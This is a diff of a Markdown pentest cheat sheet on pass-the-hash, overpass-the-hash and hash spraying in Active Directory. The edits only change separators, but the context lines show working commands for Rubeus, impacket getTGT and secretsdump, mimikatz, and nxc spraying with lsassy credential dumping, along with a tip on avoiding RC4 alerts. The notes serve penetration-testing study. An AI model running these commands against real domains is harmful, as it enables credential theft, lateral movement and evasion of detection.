@@ -18,7 +18,7 @@ linked:
 ---
 # Pass-the-Hash - Overpass-the-Hash & Hash Spray
 
-***
+---
 
 ## Overpass-the-Hash Concept
 
@@ -31,7 +31,7 @@ linked:
 | Required | NT hash OR AES key del user | Pre-attack. |
 ^pth-overpass-concept
 
-___
+---
 
 ## Rubeus asktgt (Windows)
 
@@ -57,7 +57,7 @@ dir \\dc01.corp.local\C$
 
 **AES preferred:** RC4 hash request triggers `Encryption type RC4 used` alerts. AES256 = baseline modern auth, no alert.
 
-___
+---
 
 ## getTGT.py (Linux)
 
@@ -79,7 +79,7 @@ export KRB5CCNAME=Administrator.ccache
 impacket-secretsdump -k -no-pass corp.local/Administrator@dc01.corp.local -just-dc
 ```
 
-___
+---
 
 ## mimikatz Overpass
 
@@ -93,7 +93,7 @@ ___
 
 **Cómo funciona overpass via mimikatz:** después de `sekurlsa::pth`, el primer Kerberos request del cmd injected genera TGT usando NT hash. Próximas auth = Kerberos transparente.
 
-___
+---
 
 ## Hash Spray (1 hash × N targets)
 
@@ -119,7 +119,7 @@ nxc smb 10.10.10.0/24 -u administrator -H $NT --local-auth | grep "Pwn3d"
 # Cada uno = SYSTEM RCE potential
 ```
 
-___
+---
 
 ## Hash Spray (1 user × N hashes)
 
@@ -131,7 +131,7 @@ ___
 
 **Caveat:** spray multiple hashes = multiple bad attempts → lockout risk. Sin `--no-bruteforce` flag, nxc trata como brute force = lockout.
 
-___
+---
 
 ## Cross-Domain / Forest Spray
 
@@ -142,7 +142,7 @@ ___
 | `Rubeus.exe asktgt /user:user /rc4:<NT> /domain:partner.com /dc:<foreign-DC> /ptt` | Cross-domain Windows | Standard. |
 ^pth-overpass-cross
 
-___
+---
 
 ## Spray + Pivoting
 
@@ -165,7 +165,7 @@ nxc smb pwned.txt -u administrator -H $NT --local-auth -M lsassy
 # Output: nuevos hashes de users logueados
 ```
 
-___
+---
 
 ## Common Errors
 
@@ -178,4 +178,4 @@ ___
 | nxc spray output sin `Pwn3d!` | Hash válido pero sin admin priv | Try other users / methods. |
 ^pth-overpass-errors
 
-***
+---
